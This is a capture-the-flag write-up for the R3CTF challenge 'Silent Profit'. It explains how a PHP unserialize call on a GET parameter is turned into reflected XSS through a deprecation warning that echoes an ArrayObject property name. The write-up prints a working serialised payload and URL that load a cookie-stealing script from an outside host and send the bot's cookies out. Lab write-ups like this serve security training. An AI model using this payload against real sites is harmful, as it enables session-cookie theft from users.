# Silent Profit (solved by: @MrSpavn)

## Category: Misc • Points: 200

## Description:
### *🔇*
---
## Server analysis

### Server code
```PHP
<?php 
show_source(__FILE__);
unserialize($_GET['data']);
```

we can see the deserialization function and GET["data"] , we need to find a way to make PHP output html code and embed XSS there that will steal the cookie, after which the bot goes to the site using our link

## Attack

After trying out lot possible options, i detected when im trying put to ArrayObject element as ->name istead of ["name"] php throws Warning with full variable name, so i make little code to serialize data:
```PHP
$data = new ArrayObject();
$data->vname = "1";
$serialized = serialize($data);
$serialized2 = urlencode($serialized);
echo $serialized;
echo "</br>";
echo $serialized2;
```
after running that code we get 
```
O:11:"ArrayObject":4:{i:0;i:0;i:1;a:0:{}i:2;a:1:{s:5:"vname";s:1:"1";}i:3;N;}
```
and php throw long warning that using vname is deprecated and bla bla bla

So next i just changed 
```
vname
```
to 
```
<script src="https://redactedre.da/ctf/cockie-steal/cookie.js"></script>
```
and got
```
O:11:"ArrayObject":4:{i:0;i:0;i:1;a:0:{}i:2;a:1:{s:72:"<script src="https://redactedre.da/ctf/cockie-steal/cookie.js"></script>";s:1:"1";}i:3;N;}
```

then we can just send it to XSS bot 
```
http://localhost/?data=O:11:"ArrayObject":4:{i:0;i:0;i:1;a:0:{}i:2;a:1:{s:72:"<script src="https://redactedre.da/ctf/cockie-steal/cookie.js"></script>";s:1:"1";}i:3;N;}
```
And now my php log file contains bot cookies

## Results

Cookie => flag=R3CTF{WonT_flX_dEF1niT31y_N0t_4_SeCUr1Ty-I5su3_689}
